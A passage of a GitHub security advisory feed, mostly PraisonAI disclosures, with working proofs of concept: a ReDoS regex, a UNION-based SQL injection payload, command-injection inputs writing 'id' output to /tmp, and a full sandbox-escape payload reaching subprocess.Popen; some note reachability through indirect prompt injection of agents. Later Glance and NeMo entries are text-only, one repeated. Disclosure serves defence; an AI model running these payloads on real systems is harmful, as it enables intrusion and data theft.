<p><code>MCPToolIndex.search_tools()</code> compiles a caller-supplied string directly as a Python regular expression with no validation, sanitization, or timeout. A crafted regex causes catastrophic backtracking in the <code>re</code> engine, blocking the Python thread for hundreds of seconds and causing a complete service outage.</p>
<h3 id="details">Details</h3>
<p><code>tool_index.py:365</code> (source) -&gt; <code>tool_index.py:368</code> (sink)</p>
<pre><code class="language-python"># source -- query taken directly from caller, no validation
def search_tools(self, query: str) -&gt; List[ToolInfo]:
    import re

# sink -- compiled and applied with no timeout or exception handling
    pattern = re.compile(query, re.IGNORECASE)
    for tool in self.get_all_tools():
        if pattern.search(tool.name) or pattern.search(tool.hint):
            matches.append(tool)
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># tested on: praisonai==1.5.87 (source install)
# install: pip install -e src/praisonai
import sys, time, json
sys.path.insert(0, 'src/praisonai')
from pathlib import Path

mcp_dir = Path.home() / '.praison' / 'mcp' / 'servers' / 'test_server'
mcp_dir.mkdir(parents=True, exist_ok=True)
(mcp_dir / '_index.json').write_text(json.dumps([
    {"name": "a" * 30 + "!", "hint": "a" * 30 + "!", "server": "test_server"}
]))
(mcp_dir / '_status.json').write_text(json.dumps({
    "server": "test_server", "available": True, "auth_required": False,
    "last_sync": time.time(), "tool_count": 1, "error": None
}))

from praisonai.mcp_server.tool_index import MCPToolIndex
index = MCPToolIndex()

start = time.monotonic()
results = index.search_tools("(a+)+$")
print(f"Returned in {time.monotonic() - start:.1f}s")
# expected output: Returned in 376.0s
</code></pre>
<h3 id="impact">Impact</h3>
<p>A single crafted query blocks the Python thread for hundreds of seconds, causing a complete service outage for the duration. The MCP server HTTP transport runs without an API key by default, making this reachable by any attacker on the network. Repeated requests sustain the DoS indefinitely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8w9j-hc3g-3g7f">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-8w9j-hc3g-3g7f</a></li>
<li><a href="https://github.com/advisories/GHSA-8w9j-hc3g-3g7f">https://github.com/advisories/GHSA-8w9j-hc3g-3g7f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8w9j-hc3g-3g7f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-01T23:21:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI Has Second-Order SQL Injection in `get_all_user_threads`]]></title>
        <id>https://github.com/advisories/GHSA-9cq8-3v94-434g</id>
        <link href="https://github.com/advisories/GHSA-9cq8-3v94-434g"/>
        <updated>2026-04-01T23:20:34.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>get_all_user_threads</code> function constructs raw SQL queries using f-strings with unescaped thread IDs fetched from the database. An attacker stores a malicious thread ID via <code>update_thread</code>. When the application loads the thread list, the injected payload executes and grants full database access.</p>
<hr>
<h2 id="details">Details</h2>
<p><strong>File Path:</strong><br><code>src/praisonai/praisonai/ui/sql_alchemy.py</code></p>
<p><strong>Flow:</strong></p>
<ul>
<li><strong>Source (Line 539):</strong></li>
</ul>
<pre><code class="language-python">await data_layer.update_thread(thread_id=payload, user_id=user)
</code></pre>
<ul>
<li><strong>Hop (Line 547):</strong></li>
</ul>
<pre><code class="language-python">thread_ids = "('" + "','".join([t["thread_id"] for t in user_threads]) + "')"
</code></pre>
<ul>
<li><strong>Sink (Line 576):</strong></li>
</ul>
<pre><code class="language-sql">WHERE s."threadId" IN {thread_ids}
</code></pre>
<hr>
<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
<pre><code class="language-python">
import asyncio
from praisonai.ui.sql_alchemy import SQLAlchemyDataLayer

async def run_poc():
    data_layer = SQLAlchemyDataLayer(conninfo="sqlite+aiosqlite:///app.db")

    # Insert a valid thread
    await data_layer.update_thread(
        thread_id="valid_thread", 
        user_id="attacker"
    )

    # Inject malicious payload
    payload = "x') UNION SELECT name, null, null, 'valid_thread', null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null FROM sqlite_master--"

    await data_layer.update_thread(
        thread_id=payload, 
        user_id="attacker"
    )

    # Trigger vulnerable function
    result = await data_layer.get_all_user_threads(user_id="attacker")

    for thread in result:
        if getattr(thread, 'id', '') == 'valid_thread':
            for step in getattr(thread, 'steps', []):
                print(getattr(step, 'id', ''))

asyncio.run(run_poc())

# Expected Output:
# sqlite_master table names printed to console
</code></pre>
<hr>
<h2 id="impact">Impact</h2>
<p>An attacker can achieve full database compromise, including:</p>
<ul>
<li>Exfiltration of sensitive data (user emails, session tokens, API keys)</li>
<li>Access to all conversation histories</li>
<li>Ability to modify or delete database contents</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9cq8-3v94-434g">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9cq8-3v94-434g</a></li>
<li><a href="https://github.com/advisories/GHSA-9cq8-3v94-434g">https://github.com/advisories/GHSA-9cq8-3v94-434g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9cq8-3v94-434g</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-01T23:20:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonai] PraisonAI: OS Command Injection in MCPHandler.parse_mcp_command()]]></title>
        <id>https://github.com/advisories/GHSA-9gm9-c8mq-vq7m</id>
        <link href="https://github.com/advisories/GHSA-9gm9-c8mq-vq7m"/>
        <updated>2026-04-01T23:20:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>--mcp</code> CLI argument is passed directly to <code>shlex.split()</code> and forwarded through the call chain to <code>anyio.open_process()</code> with no validation, allowlist check, or sanitization at any hop, allowing arbitrary OS command execution as the process user.</p>
<h3 id="details">Details</h3>
<p><code>cli/features/mcp.py:61</code> (source) -&gt; <code>praisonaiagents/mcp/mcp.py:345</code> (hop) -&gt; <code>mcp/client/stdio/__init__.py:253</code> (sink)</p>
<pre><code class="language-python"># source
parts = shlex.split(command)

# hop
cmd, args, env = self.parse_mcp_command(command, env_vars)
self.server_params = StdioServerParameters(command=cmd, args=arguments)

# sink
process = await anyio.open_process([command, *args])
</code></pre>
<p>Fixed in commit <code>47bff65413beaa3c21bf633c1fae4e684348368c</code> (v4.5.69) by introducing a command allowlist:</p>
<pre><code class="language-python">ALLOWED_COMMANDS = {"npx", "uvx", "node", "python"}
if cmd not in ALLOWED_COMMANDS:
    raise ValueError(f"Disallowed command: {cmd}")
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># tested on: praisonai==4.5.48
# install: pip install praisonai==4.5.48
# run: praisonai --mcp "bash -c 'id &gt; /tmp/pwned'"
# verify: cat /tmp/pwned
# expected output: uid=1000(...) gid=1000(...) groups=1000(...)
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any deployment where the <code>--mcp</code> argument is influenced by untrusted input is exposed to full OS command execution as the process user. No authentication is required.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9gm9-c8mq-vq7m">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9gm9-c8mq-vq7m</a></li>
<li><a href="https://github.com/MervinPraison/PraisonAI/commit/47bff65413beaa3c21bf633c1fae4e684348368c">https://github.com/MervinPraison/PraisonAI/commit/47bff65413beaa3c21bf633c1fae4e684348368c</a></li>
<li><a href="https://github.com/advisories/GHSA-9gm9-c8mq-vq7m">https://github.com/advisories/GHSA-9gm9-c8mq-vq7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9gm9-c8mq-vq7m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-01T23:20:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonaiagents] PraisonAI: Shell Injection in run_python() via Unescaped $() Substitution]]></title>
        <id>https://github.com/advisories/GHSA-w37c-qqfp-c67f</id>
        <link href="https://github.com/advisories/GHSA-w37c-qqfp-c67f"/>
        <updated>2026-04-01T23:18:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>run_python()</code> in <code>praisonai</code> constructs a shell command string by interpolating user-controlled code into <code>python3 -c "&lt;code&gt;"</code> and passing it to <code>subprocess.run(..., shell=True)</code>. The escaping logic only handles <code>\</code> and <code>"</code>, leaving <code>$()</code> and backtick substitutions unescaped, allowing arbitrary OS command execution before Python is invoked.</p>
<h3 id="details">Details</h3>
<p><code>execute_command.py:290</code> (source) -&gt; <code>execute_command.py:297</code> (hop) -&gt; <code>execute_command.py:310</code> (sink)</p>
<pre><code class="language-python"># source -- user-controlled code argument
def run_python(code: str, cwd=None, timeout=60):

# hop -- incomplete escaping, $ and () not handled
    escaped_code = code.replace('\\', '\\\\').replace('"', '\\"')
    command = f'{python_cmd} -c "{escaped_code}"'

# sink -- shell=True expands $() before python3 runs
    return execute_command(command=command, cwd=cwd, timeout=timeout)
    # execute_command calls subprocess.run(command, shell=True, ...)
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python"># tested on: praisonai==0.0.81 (source install, commit HEAD 2026-03-30)
# install: pip install -e src/praisonai
import sys
sys.path.insert(0, 'src/praisonai')
from praisonai.code.tools.execute_command import run_python

result = run_python(code='$(id &gt; /tmp/injected)')
print(result)

# verify
import subprocess
print(subprocess.run(['cat', '/tmp/injected'], capture_output=True, text=True).stdout)
# expected output: uid=1000(narey) gid=1000(narey) groups=1000(narey)...
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any agent pipeline or API consumer that passes user or task-supplied content to <code>run_python()</code> is exposed to full OS command execution as the process user. The function is reachable via indirect prompt injection and the auto-generated Flask server deploys with <code>AUTH_ENABLED = False</code> by default when no token is configured.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-w37c-qqfp-c67f">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-w37c-qqfp-c67f</a></li>
<li><a href="https://github.com/advisories/GHSA-w37c-qqfp-c67f">https://github.com/advisories/GHSA-w37c-qqfp-c67f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w37c-qqfp-c67f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-01T23:18:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[praisonaiagents] PraisonAI: Python Sandbox Escape via str Subclass startswith() Override in execute_code]]></title>
        <id>https://github.com/advisories/GHSA-6vh2-h83c-9294</id>
        <link href="https://github.com/advisories/GHSA-6vh2-h83c-9294"/>
        <updated>2026-04-01T23:17:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>execute_code()</code> in <code>praisonai-agents</code> runs attacker-controlled Python inside a three-layer sandbox that can be fully bypassed by passing a <code>str</code> subclass with an overridden <code>startswith()</code> method to the <code>_safe_getattr</code> wrapper, achieving arbitrary OS command execution on the host.</p>
<h3 id="details">Details</h3>
<p><code>python_tools.py:20</code> (source) -&gt; <code>python_tools.py:22</code> (guard bypass) -&gt; <code>python_tools.py:161</code> (sink)</p>
<pre><code class="language-python"># source -- _safe_getattr accepts any str subclass
def _safe_getattr(obj, name, *default):
    if isinstance(name, str) and name.startswith('_'):  # isinstance passes for subclasses
        raise AttributeError(...)

# hop -- type() is whitelisted in safe_builtins, creates str subclass without class keyword
FakeStr = type('FakeStr', (str,), {'startswith': lambda self, *a: False})

# sink -- Popen reached via __subclasses__ walk
r = Popen(['id'], stdout=PIPE, stderr=PIPE)
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">
from praisonaiagents.tools.python_tools import execute_code

payload = """
t = type
FakeStr = t('FakeStr', (str,), {'startswith': lambda self, *a: False})

mro_attr  = FakeStr(''.join(['_','_','m','r','o','_','_']))
subs_attr = FakeStr(''.join(['_','_','s','u','b','c','l','a','s','s','e','s','_','_']))
mod_attr  = FakeStr(''.join(['_','_','m','o','d','u','l','e','_','_']))
name_attr = FakeStr(''.join(['_','_','n','a','m','e','_','_']))
PIPE = -1

obj_class = getattr(type(()), mro_attr)[1]
for cls in getattr(obj_class, subs_attr)():
    try:
        m = getattr(cls, mod_attr, '')
        n = getattr(cls, name_attr, '')
        if m == 'subprocess' and n == 'Popen':
            r = cls(['id'], stdout=PIPE, stderr=PIPE)
            out, err = r.communicate()
            print('RCE:', out.decode())
            break
    except Exception as e:
        print('ERR:', e)
"""

result = execute_code(code=payload)
print(result)
# expected output: RCE: uid=1000(narey) gid=1000(narey) groups=1000(narey)...
</code></pre>
<h3 id="impact">Impact</h3>
<p>Any user or agent pipeline running <code>execute_code()</code> is exposed to full OS command execution as the process user. Deployments using <code>bot.py</code>, <code>autonomy_mode.py</code>, or <code>bots_cli.py</code> set <code>PRAISONAI_AUTO_APPROVE=true</code> by default, meaning no human confirmation is required and the tool fires silently when triggered via indirect prompt injection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6vh2-h83c-9294">https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-6vh2-h83c-9294</a></li>
<li><a href="https://github.com/advisories/GHSA-6vh2-h83c-9294">https://github.com/advisories/GHSA-6vh2-h83c-9294</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6vh2-h83c-9294</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-01T23:17:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glance] OpenStack Glance is affected by Server-Side Request Forgery (SSRF)]]></title>
        <id>https://github.com/advisories/GHSA-mc26-q38v-83gv</id>
        <link href="https://github.com/advisories/GHSA-mc26-q38v-83gv"/>
        <updated>2026-04-01T23:16:41.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Glance versions &lt; 29.1.1, &gt;= 30.0.0 &lt; 30.1.1, == 31.0.0 are affected by Server-Side Request Forgery (SSRF). By use of HTTP redirects, an authenticated user can bypass URL validation checks and redirect to internal services. Only the glance image import functionality is affected. In particular, the web-download and glance-download import methods are subject to this vulnerability, as is the optional (not enabled by default) ovf_process image import plugin.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34881">https://nvd.nist.gov/vuln/detail/CVE-2026-34881</a></li>
<li><a href="https://bugs.launchpad.net/glance/+bug/2138602">https://bugs.launchpad.net/glance/+bug/2138602</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-004.html">https://security.openstack.org/ossa/OSSA-2026-004.html</a></li>
<li><a href="https://github.com/advisories/GHSA-mc26-q38v-83gv">https://github.com/advisories/GHSA-mc26-q38v-83gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mc26-q38v-83gv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-31T06:31:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glance] OpenStack Glance is affected by Server-Side Request Forgery (SSRF)]]></title>
        <id>https://github.com/advisories/GHSA-mc26-q38v-83gv</id>
        <link href="https://github.com/advisories/GHSA-mc26-q38v-83gv"/>
        <updated>2026-04-01T23:16:41.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Glance versions &lt; 29.1.1, &gt;= 30.0.0 &lt; 30.1.1, == 31.0.0 are affected by Server-Side Request Forgery (SSRF). By use of HTTP redirects, an authenticated user can bypass URL validation checks and redirect to internal services. Only the glance image import functionality is affected. In particular, the web-download and glance-download import methods are subject to this vulnerability, as is the optional (not enabled by default) ovf_process image import plugin.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34881">https://nvd.nist.gov/vuln/detail/CVE-2026-34881</a></li>
<li><a href="https://bugs.launchpad.net/glance/+bug/2138602">https://bugs.launchpad.net/glance/+bug/2138602</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-004.html">https://security.openstack.org/ossa/OSSA-2026-004.html</a></li>
<li><a href="https://github.com/advisories/GHSA-mc26-q38v-83gv">https://github.com/advisories/GHSA-mc26-q38v-83gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mc26-q38v-83gv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-31T06:31:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[glance] OpenStack Glance is affected by Server-Side Request Forgery (SSRF)]]></title>
        <id>https://github.com/advisories/GHSA-mc26-q38v-83gv</id>
        <link href="https://github.com/advisories/GHSA-mc26-q38v-83gv"/>
        <updated>2026-04-01T23:16:41.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Glance versions &lt; 29.1.1, &gt;= 30.0.0 &lt; 30.1.1, == 31.0.0 are affected by Server-Side Request Forgery (SSRF). By use of HTTP redirects, an authenticated user can bypass URL validation checks and redirect to internal services. Only the glance image import functionality is affected. In particular, the web-download and glance-download import methods are subject to this vulnerability, as is the optional (not enabled by default) ovf_process image import plugin.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34881">https://nvd.nist.gov/vuln/detail/CVE-2026-34881</a></li>
<li><a href="https://bugs.launchpad.net/glance/+bug/2138602">https://bugs.launchpad.net/glance/+bug/2138602</a></li>
<li><a href="https://security.openstack.org/ossa/OSSA-2026-004.html">https://security.openstack.org/ossa/OSSA-2026-004.html</a></li>
<li><a href="https://github.com/advisories/GHSA-mc26-q38v-83gv">https://github.com/advisories/GHSA-mc26-q38v-83gv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mc26-q38v-83gv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-31T06:31:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nemo-toolkit] NVIDIA NeMo Framework contains a vulnerability leading to Remote Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-v7v2-m736-cf3c</id>
        <link href="https://github.com/advisories/GHSA-v7v2-m736-cf3c"/>
        <updated>2026-04-01T23:13:54.000Z</updated>
        <content type="html"><![CDATA[<p>NVIDIA NeMo Framework contains a vulnerability where an attacker may cause remote code execution. A successful exploit of this vulnerability might lead to code execution, escalation of privileges, information disclosure and data tampering.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24159">https://nvd.nist.gov/vuln/detail/CVE-2026-24159</a></li>
<li><a href="https://nvidia.custhelp.com/app/answers/detail/a_id/5800">https://nvidia.custhelp.com/app/answers/detail/a_id/5800</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2026-24159">https://www.cve.org/CVERecord?id=CVE-2026-24159</a></li>
<li><a href="https://github.com/advisories/GHSA-v7v2-m736-cf3c">https://github.com/advisories/GHSA-v7v2-m736-cf3c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v7v2-m736-cf3c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T21:31:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nemo-toolkit] NVIDIA NeMo Framework contains an RCE vulnerability in checkpoint loading]]></title>
        <id>https://github.com/advisories/GHSA-m4jw-wgmf-889x</id>
        <link href="https://github.com/advisories/GHSA-m4jw-wgmf-889x"/>
        <updated>2026-04-01T23:11:40.000Z</updated>
        <content type="html"><![CDATA[<p>NVIDIA NeMo Framework contains a vulnerability in checkpoint loading where an attacker could cause remote code execution. A successful exploit of this vulnerability might lead to code execution, escalation of privileges, information disclosure and data tampering.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24157">https://nvd.nist.gov/vuln/detail/CVE-2026-24157</a></li>
<li><a href="https://nvidia.custhelp.com/app/answers/detail/a_id/5800">https://nvidia.custhelp.com/app/answers/detail/a_id/5800</a></li>
<li><a href="https://www.cve.org/CVERecord?id=CVE-2026-24157">https://www.cve.org/CVERecord?id=CVE-2026-24157</a></li>
<li><a href="https://github.com/advisories/GHSA-m4jw-wgmf-889x">https://github.com/advisories/GHSA-m4jw-wgmf-889x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m4jw-wgmf-889x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T21:31:24.000Z</published>
    </entry>
</feed>